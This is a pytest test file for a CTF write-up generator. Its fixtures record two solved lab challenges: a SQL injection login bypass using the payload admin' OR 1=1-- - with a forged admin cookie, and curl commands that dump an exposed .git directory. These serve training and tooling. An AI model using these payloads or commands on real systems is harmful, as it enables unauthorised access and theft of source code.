import sys
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT))

from scripts.writeup import generate_writeup  # noqa: E402


def test_writeup_uses_actual_problem_and_poc_format(tmp_path, monkeypatch):
    monkeypatch.setattr('scripts.writeup.WRITEUPS_DIR', tmp_path / 'writeups')
    mem = tmp_path / 'memory.md'
    mem.write_text(
        '''# Login Bypass Lab

- date: 2026-08-20
- status: solved
- platform: TryHards
- category: web
- tools: http_request, sqli_payloads, extract_flags_tool
- flag: TryHards{demo_flag}

## Problem Description

Admin login at `http://ctf.local/login` and recover flag from dashboard.

## Approach

- `http_request` ({"method":"POST","url":"http://ctf.local/login","data":"username=admin' OR 1=1-- -&password=x","headers_csv":"Content-Type: application/x-www-form-urlencoded"}) → ok
  out: HTTP/1.1 302 Found Location: /admin
- `http_request` ({"method":"GET","url":"http://ctf.local/admin","headers_csv":"Cookie: session=admin"}) → ok
  out: TryHards{demo_flag}
- `extract_flags_tool` ({"text":"TryHards{demo_flag}"}) → ok
  out: 1 candidate(s): TryHards{demo_flag}

## What worked / lessons

SQLi auth bypass on username parameter.
''',
        encoding='utf-8',
    )

    out = generate_writeup(mem)
    text = out.read_text(encoding='utf-8')

    assert '## 1. Problem Description' in text
    assert 'Admin login at `http://ctf.local/login`' in text
    assert '## 4. PoC Walkthrough (Step-by-Step)' in text
    assert "curl -s -i -X POST" in text
    assert "--data" in text
    assert "username=admin' OR 1=1-- -&password=x" in text
    assert '## 6. Burp Suite PoC' in text
    assert 'POST /login HTTP/1.1' in text
    assert '## 8. Flag' in text or '## 9. Flag' in text
    assert '`TryHards{demo_flag}`' in text
    assert 'Reference playbook' not in text


def test_writeup_records_manual_terminal_commands_when_no_mcp_runs(tmp_path, monkeypatch):
    monkeypatch.setattr('scripts.writeup.WRITEUPS_DIR', tmp_path / 'writeups')
    mem = tmp_path / 'memory.md'
    mem.write_text(
        '''# Git Leak

- date: 2026-08-20
- status: solved
- platform: TryHards
- category: web
- tools: curl, python-zlib
- flag: TryHards{git_flag}

## Problem Description

Find flag on internal web server with exposed .git directory.

## Commands / Terminal

```bash
curl -s http://target/.git/HEAD
python3 dump_git.py http://target/.git/
```

## PoC

1. Check `.git/HEAD`.
2. Dump git objects.
3. Inspect deleted commit containing flag.txt.

## Evidence snippet

TryHards{git_flag}

## What worked / lessons

Git object dump succeeded even though git clone was blocked.
''',
        encoding='utf-8',
    )

    out = generate_writeup(mem)
    text = out.read_text(encoding='utf-8')

    assert '## 1. Problem Description' in text
    assert 'exposed .git' in text
    assert '## 4. PoC Walkthrough (Step-by-Step)' in text
    assert 'curl -s http://target/.git/HEAD' in text
    assert 'python3 dump_git.py http://target/.git/' in text
    assert 'Git object dump succeeded' in text
    assert '`TryHards{git_flag}`' in text
    assert 'Reference playbook' not in text
